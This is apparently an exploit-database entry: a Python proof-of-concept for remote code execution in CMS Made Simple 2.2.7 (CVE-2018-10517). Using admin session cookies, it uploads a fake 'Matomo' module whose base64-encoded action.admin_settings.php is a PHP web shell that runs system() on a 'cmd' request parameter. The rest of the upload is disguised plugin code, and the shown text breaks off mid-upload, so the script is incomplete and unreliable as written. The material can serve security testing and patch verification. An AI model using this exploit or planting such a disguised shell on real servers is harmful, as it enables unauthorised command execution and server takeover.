# Exploit Title: CMS Made Simple 2.2.7 - Remote Code Execution
# Date: 2018-11-04
# Exploit Author: Lucian Ioan Nitescu
# Contact: https://twitter.com/LucianNitescu
# Webiste: https://nitesculucian.github.io
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.7
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-10517

# 1. Description: 
# An attacker or a malicious user with access to the administration interface can execute code on the server.

# 2. Proof of Concept:

import requests

# target configuration (required admin credentials in order to obtain a valid session)

target_url="<YOUR HTTP(S):// URL>"
session_cookie = "<YOUR SESSION COOKIE NAME>"
session_value = "<YOUR SESSION COOKIE VALUE>"

# upload of shell unde the name of Matomo plugin

burp0_url = target_url + "/admin/moduleinterface.php"

burp0_cookies = {session_cookie: session_value}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/", "Content-Type": "multipart/form-data; boundary=---------------------------207726338310671742711263591267", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
burp0_data="-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"mact\"\r\n\r\nModuleManager,m1_,local_import,0\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"__c\"\r\n\r\n9a63802b6c4579cc01c\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"m1_upload\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n<module>\n    <dtdversion>1.3</dtdversion>\n    <name>Matomo</name>\n    <version>0.0.1</version>\n    <mincmsversion>2.1.5</mincmsversion>\n    <help><![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]></help>\n    <about><![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]></about>\n    <description><![CDATA[-- Missing Languagestring: admindescription --]]></description>\n    <file>\n      <filename>/</filename>\n      <isdir>1</isdir>\n    </file>\n    <file>\n      <filename>/action.admin_settings.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]></data>\n    </file>\n    <file>\n      <filename>/action.admin_statistics.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]></data>\n    </file>\n    <file>\n      <filename>/action.default.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]></data>\n    </file>\n    <file>\n      <filename>/action.savesettings.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]></data>\n    </file>\n    <file>\n      <filename>/lang/</filename>\n      <isdir>1</isdir>\n    </file>\n    <file>\n      <filename>/lang/en_US.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]></data>\n    </file>\n    <file>\n      <filename>/Matomo.module.php</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTANCiAqLw0KDQoNCmNsYXNzIE1hdG9tbyBleHRlbmRzIENNU01vZHVsZQ0Kew0KDQogIC8qKg0KICAgKg0KICAgKiBAdmFyIHN0cmluZw0KICAgKi8NCiAgcHJvdGVjdGVkICRtZXRhZGF0YSA9IG51bGw7DQogIHByb3RlY3RlZCAkX19lcnJvcnMgPSBudWxsOw0KICBwcm90ZWN0ZWQgJF9fbWVzc2FnZXMgPSBudWxsOw0KDQogIC8qICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiogQ09OU1RSVUNUT1IgKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiAqLw0KICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICB7DQogICAgcGFyZW50OjpfX2NvbnN0cnVjdCgpOw0KDQogICAgLypzcGxfYXV0b2xvYWRfcmVnaXN0ZXIoYXJyYXkoDQogICAgICAmJHRoaXMsDQogICAgICAnX2F1dG9sb2FkZXInDQogICAgKSk7DQoNCiAgICAkc21hcnR5ID0gU21hcnR5X0NNUzo6Z2V0X2luc3RhbmNlKCk7DQogICAgaWYgKCRzbWFydHkpIHsNCiAgICAgICRzbWFydHktPnJlZ2lzdGVyQ2xhc3MoJ2htX3NtYXJ0eScsICdITV9TbWFydHknKTsNCiAgICAgICRzbWFydHktPnJlZ2lzdGVyUmVzb3VyY2UoJ2htX3RwbCcsIG5ldyBITV9UZW1wbGF0ZVJlc291cmNlKCkpOw0KICAgIH0qLw0KICB9DQoNCiAgLyoqDQogICAqIEEgc2ltcGxlIGF1dG9sb2FkZXIgZm9yIGNsYXNzIGZpbGVzLg0KICAgKg0KICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lIGNsYXNzIG5hbWUNCiAgICovDQogIC8qcHJpdmF0ZSBmaW5hbCBmdW5jdGlvbiBfYXV0b2xvYWRlcigkbmFtZSkNCiAgew0KICAgICRjbGFzc0ZpbGUgPSAkdGhpcy0+R2V0TW9kdWxlUGF0aCgpIC4gJy9saWIvJyAuIHN0cl9yZXBsYWNlKCdfJywgJy8nLCAkbmFtZSkgLiAnLnBocCc7DQogICAgaWYgKGZpbGVfZXhpc3RzKCRjbGFzc0ZpbGUpKSB7DQogICAgICByZXF1aXJlX29uY2UgJGNsYXNzRmlsZTsNCiAgICB9DQogIH0qLw0KDQogIC8qICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiogTU9EVUxFIENPTkZJRyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqICovDQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpHZXRGcmllbmRseU5hbWUoKQ0KICAgKi8NCiAgcHVibGljIGZ1bmN0aW9uIEdldEZyaWVuZGx5TmFtZSgpDQogIHsNCiAgICByZXR1cm4gJHRoaXMtPkxhbmcoJ2ZyaWVuZGx5bmFtZScpOw0KICB9DQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpHZXRWZXJzaW9uKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBHZXRWZXJzaW9uKCkNCiAgew0KICAgIHJldHVybiAnMC4wLjEnOw0KICB9DQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpNaW5pbXVtQ01TVmVyc2lvbigpDQogICAqLw0KICBwdWJsaWMgZnVuY3Rpb24gTWluaW11bUNNU1ZlcnNpb24oKQ0KICB7DQogICAgcmV0dXJuICIyLjEuNSI7DQogIH0NCg0KICAvKg0KICAgKiAobm9uLVBIUGRvYykgQHNlZSBDTVNNb2R1bGU6Ok1heGltdW1DTVNWZXJzaW9uKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBNYXhpbXVtQ01TVmVyc2lvbigpDQogIHsNCiAgICByZXR1cm4gIjMiOw0KICB9DQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpHZXRIZWxwKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBHZXRIZWxwKCkNCiAgew0KICAgIHJldHVybiAkdGhpcy0+TGFuZygnaGVscCcpOw0KICB9DQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpHZXRBdXRob3IoKQ0KICAgKi8NCiAgcHVibGljIGZ1bmN0aW9uIEdldEF1dGhvcigpDQogIHsNCiAgICByZXR1cm4gJ2V5ZWRlZS1tZWRpYSc7DQogIH0NCg0KICAvKg0KICAgKiAobm9uLVBIUGRvYykgQHNlZSBDTVNNb2R1bGU6OkdldEF1dGhvckVtYWlsKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBHZXRBdXRob3JFbWFpbCgpDQogIHsNCiAgICByZXR1cm4gJ21vcnRlbkBwb3Vsc2VuLm9yZyc7DQogIH0NCg0KICAvKg0KICAgKiAobm9uLVBIUGRvYykgQHNlZSBDTVNNb2R1bGU6OkdldENoYW5nZUxvZygpDQogICAqLw0KICBwdWJsaWMgZnVuY3Rpb24gR2V0Q2hhbmdlTG9nKCkNCiAgew0KICAgIHJldHVybiAkdGhpcy0+TGFuZygnY2hhbmdlbG9nJyk7DQogIH0NCg0KICAvKg0KICAgKiAobm9uLVBIUGRvYykgQHNlZSBDTVNNb2R1bGU6OklzUGx1Z2luTW9kdWxlKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBJc1BsdWdpbk1vZHVsZSgpDQogIHsNCiAgICByZXR1cm4gdHJ1ZTsNCiAgfQ0KDQogIC8qDQogICAqIChub24tUEhQZG9jKSBAc2VlIENNU01vZHVsZTo6SGFzQWRtaW4oKQ0KICAgKi8NCiAgcHVibGljIGZ1bmN0aW9uIEhhc0FkbWluKCkNCiAgew0KICAgIHJldHVybiB0cnVlOw0KICB9DQoNCiAgLyoNCiAgICogKG5vbi1QSFBkb2MpIEBzZWUgQ01TTW9kdWxlOjpHZXRBZG1pbkRlc2NyaXB0aW9uKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBHZXRBZG1pbkRlc2NyaXB0aW9uKCkNCiAgew0KICAgIHJldHVybiAkdGhpcy0+TGFuZygnYWRtaW5kZXNjcmlwdGlvbicpOw0KICB9DQoNCiAgcHVibGljIGZ1bmN0aW9uIEdldEFkbWluTWVudUl0ZW1zKCkNCiAgew0KICAgICRvdXQgPSBhcnJheSgpOw0KDQogICAgJG9iaiA9IG5ldyBDbXNBZG1pbk1lbnVJdGVtKCk7DQogICAgJG9iai0+bW9kdWxlID0gJHRoaXMtPkdldE5hbWUoKTsNCiAgICAkb2JqLT5zZWN0aW9uID0gJ2V4dGVuc2lvbnMnOw0KICAgICRvYmotPnRpdGxlID0gJHRoaXMtPkxhbmcoJ3RpdGxlX3N0YXRpc3RpY3MnKTsNCiAgICAkb2JqLT5kZXNjcmlwdGlvbiA9ICR0aGlzLT5MYW5nKCdkZXNjX3N0YXRpc3RpY3MnKTsNCiAgICAkb2JqLT5hY3Rpb24gPSAnYWRtaW5fc3RhdGlzdGljcyc7DQogICAgJG9iai0+dXJsID0gJHRoaXMtPmNyZWF0ZV91cmwoJ20xXycsICRvYmotPmFjdGlvbik7DQogICAgJG9iai0+cHJpb3JpdHkgPSA1MDsNCiAgICAkb3V0W10gPSAkb2JqOw0KDQogICAgaWYgKCR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykpIHsNCiAgICAgICRvYmogPSBuZXcgQ21zQWRtaW5NZW51SXRlbSgpOw0KICAgICAgJG9iai0+bW9kdWxlID0gJHRoaXMtPkdldE5hbWUoKTsNCiAgICAgICRvYmotPnNlY3Rpb24gPSAnc2l0ZWFkbWluJzsNCiAgICAgICRvYmotPnRpdGxlID0gJHRoaXMtPkxhbmcoJ3RpdGxlX3NldHRpbmdzJyk7DQogICAgICAkb2JqLT5kZXNjcmlwdGlvbiA9ICR0aGlzLT5MYW5nKCdkZXNjX3NldHRpbmdzJyk7DQogICAgICAkb2JqLT5hY3Rpb24gPSAnYWRtaW5fc2V0dGluZ3MnOw0KICAgICAgJG9iai0+dXJsID0gJHRoaXMtPmNyZWF0ZV91cmwoJ20xXycsICRvYmotPmFjdGlvbik7DQogICAgICAkb3V0W10gPSAkb2JqOw0KICAgICAgJG9iai0+cHJpb3JpdHkgPSA1MDsNCiAgICB9DQogICAgcmV0dXJuICRvdXQ7DQogIH0NCg0KICBwdWJsaWMgZnVuY3Rpb24gSW5pdGlhbGl6ZUFkbWluICgpDQogIHt9DQoNCiAgLyoqDQogICAqIChub24tUEhQZG9jKQ0KICAgKg0KICAgKiBAc2VlIENNU01vZHVsZTo6SW5pdGlhbGl6ZUZyb250ZW5kKCkNCiAgICovDQogIHB1YmxpYyBmdW5jdGlvbiBJbml0aWFsaXplRnJvbnRlbmQgKCkNCiAgew0KICAgICR0aGlzLT5SZWdpc3Rlck1vZHVsZVBsdWdpbigpOw0KDQogIC8qICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCd1c2VyJywgbnVsbCwgJHRoaXMtPkxhbmcoJ2hlbHBfdXNlcicpKTsNCiAgICAkdGhpcy0+U2V0UGFyYW1ldGVyVHlwZSgndXNlcicsIENMRUFOX0lOVCk7DQoNCiAgICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCdtb2RlbCcsIG51bGwsICR0aGlzLT5MYW5nKCdoZWxwX21vZGVsJykpOw0KICAgICR0aGlzLT5TZXRQYXJhbWV0ZXJUeXBlKCdtb2RlbCcsIENMRUFOX0lOVCk7DQoNCiAgICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCd0ZW1wbGF0ZScsIG51bGwsICR0aGlzLT5MYW5nKCdoZWxwX3RlbXBsYXRlJykpOw0KICAgICR0aGlzLT5TZXRQYXJhbWV0ZXJUeXBlKCd0ZW1wbGF0ZScsIENMRUFOX1NUUklORyk7DQoNCiAgICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCd0YXJnZXQnLCBudWxsLCAkdGhpcy0+TGFuZygnaGVscF90YXJnZXQnKSk7DQogICAgJHRoaXMtPlNldFBhcmFtZXRlclR5cGUoJ3RhcmdldCcsIENMRUFOX1NUUklORyk7DQoNCiAgICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCdwYWdlbGltaXQnLCBudWxsLCAkdGhpcy0+TGFuZygnaGVscF9wYWdlbGltaXQnKSk7DQogICAgJHRoaXMtPlNldFBhcmFtZXRlclR5cGUoJ3BhZ2VsaW1pdCcsIENMRUFOX0lOVCk7DQoNCiAgICAkdGhpcy0+Q3JlYXRlUGFyYW1ldGVyKCdwYWdlJywgbnVsbCwgJHRoaXMtPkxhbmcoJ2hlbHBfcGFnZScpKTsNCiAgICAkdGhpcy0+U2V0UGFyYW1ldGVyVHlwZSgncGFnZScsIENMRUFOX0lOVCk7Ki8NCg0KDQogIH0NCg0KDQogIGZ1bmN0aW9uIE5lb1Byb2Nlc3NUZW1wbGF0ZSgkZmlsZW5hbWUpDQogIHsNCiAgICBpZiAoZmlsZV9leGlzdHMoZGlybmFtZShfX0ZJTEVfXykgLiAiL3RlbXBsYXRlcy8iIC4gJGZpbGVuYW1lKSkgew0KICAgICAgJGRhdGEgPSBmaWxlX2dldF9jb250ZW50cyhkaXJuYW1lKF9fRklMRV9fKSAuICIvdGVtcGxhdGVzLyIgLiAkZmlsZW5hbWUpOw0KICAgICAgLy9lY2hvICJkYXRhOiIuJGRhdGE7DQogICAgICByZXR1cm4gJHRoaXMtPk5lb1Byb2Nlc3NUZW1wbGF0ZUZyb21EYXRhKCRkYXRhKTsNCiAgICB9IGVsc2Ugew0KICAgICAgZWNobyAiSW52YWxpZCB0ZW1wbGF0ZSBmaWxlbmFtZTogIiAuICRmaWxlbmFtZTsNCiAgICB9DQogICAgcmV0dXJuICIiOw0KICB9DQoNCiAgZnVuY3Rpb24gTmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJGRhdGEpDQogIHsNCiAgICAkc21hcnR5ID0gU21hcnR5X0NNUzo6Z2V0X2luc3RhbmNlKCk7DQogICAgcmV0dXJuICRzbWFydHktPmZldGNoKCJzdHJpbmc6IiAuICRkYXRhKTsNCg0KICB9DQoNCiAgZnVuY3Rpb24gR2V0VHJhY2tpbmdDb2RlKCkNCiAgew0KICAgIHJldHVybiAkdGhpcy0+R2V0UHJlZmVyZW5jZSgidHJhY2tpbmdjb2RlIik7DQogIH0NCg0KDQogIGZ1bmN0aW9uIE5lb1NhdmVWYWx1ZXMoJHBhcmFtcywkdmFsdWVzLCRoYW5kbGV1bnNldD0iY2xlYXIiKSB7DQogICAgLy9lY2hvICJoaSI7ZGllKCk7DQogICAgaWYgKCFpc19hcnJheSgkdmFsdWVzKSkgew0KICAgICAgaWYgKGlzc2V0KCRwYXJhbXNbJHZhbHVlc10pKSB7DQogICAgICAgICR0aGlzLT5TZXRQcmVmZXJlbmNlKCR2YWx1ZXMsJHBhcmFtc1skdmFsdWVzXSk7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBzd2l0Y2ggKCRoYW5kbGV1bnNldCkgew0KICAgICAgICAgIGNhc2UgImNsZWFyIiA6ICR0aGlzLT5TZXRQcmVmZXJlbmNlKCR2YWx1ZXMsIiIpOyBicmVhazsNCiAgICAgICAgICBjYXNlICJyZW1vdmUiIDogJHRoaXMtPlJlbW92ZVByZWZlcmVuY2UoJHZhbHVlcyk7IGJyZWFrOw0KICAgICAgICAgIGRlZmF1bHQgOg0KICAgICAgICB9DQoNCiAgICAgIH0NCiAgICAgIHJldHVybjsNCiAgICB9DQogICAgZm9yZWFjaCgkdmFsdWVzIGFzICR2YWx1ZSkgew0KICAgICAgLy9lY2hvICJoaSIuJHBhcmFtc1skdmFsdWVdOyBkaWUoKTsNCiAgICAgIGlmIChpc3NldCgkcGFyYW1zWyR2YWx1ZV0pKSB7DQogICAgICAgICR0aGlzLT5TZXRQcmVmZXJlbmNlKCR2YWx1ZSwkcGFyYW1zWyR2YWx1ZV0pOw0KICAgICAgfSBlbHNlIHsNCg0KICAgICAgICBzd2l0Y2ggKCRoYW5kbGV1bnNldCkgew0KICAgICAgICAgIGNhc2UgImNsZWFyIiA6ICR0aGlzLT5TZXRQcmVmZXJlbmNlKCR2YWx1ZSwiIik7IGJyZWFrOw0KICAgICAgICAgIGNhc2UgInJlbW92ZSIgOiAkdGhpcy0+UmVtb3ZlUHJlZmVyZW5jZSgkdmFsdWUpOyBicmVhazsNCiAgICAgICAgICBkZWZhdWx0IDoNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIHByZigkcHJlZmVyZW5jZW5hbWUsICRkZWZhdWx0dmFsdWU9IiIpIHsNCiAgICByZXR1cm4gJHRoaXMtPkdldFByZWZlcmVuY2UoJHByZWZlcmVuY2VuYW1lLCRkZWZhdWx0dmFsdWUpOw0KICB9DQp9]]></data>\n    </file>\n    <file>\n      <filename>/moduleinfo.ini</filename>\n      <isdir>0</isdir>\n      <data><![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]></data>\n    </file>\n    <file>\n      <filename>/templates/</filename>\n      <isdir>1</isdir>\n    </file>\n    <file>\n      <filename>/templates/adminsettings.tpl</filename>\n      <isdir>0</isdir>\n      